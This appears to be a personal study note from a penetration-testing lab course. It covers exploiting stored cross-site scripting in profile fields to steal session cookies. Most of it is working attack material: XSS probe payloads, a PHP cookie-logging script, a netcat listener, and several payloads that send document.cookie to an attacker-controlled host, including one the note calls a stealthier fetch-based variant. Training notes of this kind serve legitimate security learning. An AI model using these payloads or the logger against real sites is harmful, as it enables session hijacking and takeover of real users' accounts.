---
title: d-XSS
draft: false
tags:
  - xss
---
In this section, though, we will focus on exploiting Cross-Site Scripting (XSS) vulnerabilities to obtain valid session identifiers (such as session cookies).

For a Cross-Site Scripting (XSS) attack to result in session cookie leakage, the following requirements must be fulfilled:

- Session cookies should be carried in all HTTP requests
- Session cookies should be accessible by JavaScript code (the HTTPOnly attribute should be missing)
## Exploit
### Identify XSS

> We log in to the web app and here we can edit the input fields to update our email, phone number, and country

In such cases, it is best to use payloads with event handlers like `onload` or `onerror` since they fire up automatically and also prove the highest impact on stored XSS cases. Of course, if they're blocked, you'll have to use something else like `onmouseover`.

In one field, let us specify the following payload:

```javascript
"><img src=x onerror=prompt(document.domain)>
```

By using `document.domain`, we can ensure that JavaScript code gets executed on the actual domain and not in sandboxed environment.

In the remaining two fields, let us specify the following two payloads.

```javascript
"><img src=x onerror=confirm(1)>
```

```javascript
"><img src=x onerror=alert(1)>
```

Once we save and share the payload, we can see that the last payload worked out, and there is an alert saying `1`.

Let us now check if _HTTPOnly_ is "off" using Web Developer Tools. -> _HTTPOnly_ is off!

### Session Cookie Retrieval

We identified that we could create and share publicly accessible profiles that contain our specified XSS payloads.

Let us create a cookie-logging script (save it as `log.php`) to practice obtaining a victim's session cookie through sharing a vulnerable to stored XSS public profile. The below PHP script can be hosted on a VPS or your attacking machine (depending on egress restrictions).

```php
<?php
$logFile = "cookieLog.txt";
$cookie = $_REQUEST["c"];

$handle = fopen($logFile, "a");
fwrite($handle, $cookie . "\n\n");
fclose($handle);

header("Location: http://www.google.com/");
exit;
?>
```

This script waits for anyone to request `?c=+document.cookie`, and it will then parse the included cookie.

The cookie-logging script can be run as follows.

```shell-session
jadu101@htb[/htb]$ php -S <VPN/TUN Adapter IP>:8000
[Mon Mar  7 10:54:04 2022] PHP 7.4.21 Development Server (http://<VPN/TUN Adapter IP>:8000) started
```

Now that we have the script being hosted, let's run the payload on the vulnerable input field:

```javascript
<style>@keyframes x{}</style><video style="animation-name:x" onanimationend="window.location = 'http://<VPN/TUN Adapter IP>:8000/log.php?c=' + document.cookie;"></video>
```

**Note**: If you're doing testing in the real world, try using something like [XSSHunter](https://xsshunter.com/), [Burp Collaborator](https://portswigger.net/burp/documentation/collaborator) or [Project Interactsh](https://app.interactsh.com/). A default PHP Server or Netcat may not send data in the correct form when the target web application utilizes HTTPS.

A sample HTTPS>HTTPS payload example can be found below:

```javascript
<h1

onmouseover='document.write(`<img src="https://CUSTOMLINK?cookie=${btoa(document.cookie)}">`)'>test</h1>
```

## Session Cookie Retrieval (Netcat)

Instead of a cookie-logging script, we could have also used the venerable Netcat tool.

Place below payload in the vulnerable field:

```javascript
<h1 onmouseover='document.write(`<img src="http://<VPN/TUN Adapter IP>:8000?cookie=${btoa(document.cookie)}">`)'>test</h1>
```

Let us also instruct Netcat to listen on port 8000 as follows.

```shell-session
jadu101@htb[/htb]$ nc -nlvp 8000
listening on [any] 8000 ...
```

Once the payload gets executed on the victim's browser, we will get session cookie.

Please note that the cookie is a Base64 value because we used the `btoa()` function, which will base64 encode the cookie's value. We can decode it using `atob("b64_string")` in the Dev Console of Web Developer Tools.

We don't necessarily have to use the `window.location()` object that causes victims to get redirected. We can use `fetch()`, which can fetch data (cookies) and send it to our server without any redirects. This is a stealthier way.

Find an example of such a payload below.

```javascript
<script>fetch(`http://<VPN/TUN Adapter IP>:8000?cookie=${btoa(document.cookie)}`)</script>
```

